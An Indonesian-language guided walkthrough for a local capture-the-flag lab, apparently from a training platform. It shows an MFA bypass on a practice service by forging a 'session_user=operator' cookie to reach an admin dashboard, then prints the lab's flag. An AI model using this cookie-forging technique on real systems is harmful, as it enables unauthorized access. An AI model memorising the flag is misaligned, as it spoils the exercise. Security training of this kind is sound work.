# Panduan Praktik Terbimbing: Investigasi MFA Bypass via Direct Endpoint Traversal

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **TwoFactor SecureNet** pada `http://127.0.0.1:8054`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8054/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A07-03","port":8054,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8054/`
3. Amati antarmuka operasional **TwoFactor SecureNet** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (MFA Bypass via Direct Endpoint Traversal)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -b "session_user=operator" http://127.0.0.1:8054/admin/dashboard
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Cookie: session_user=operator` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8054/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8054/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A07-03","flag":"ZITERA{mf4_byp4ss_d1r3ct_r0ut3_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{mf4_byp4ss_d1r3ct_r0ut3_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
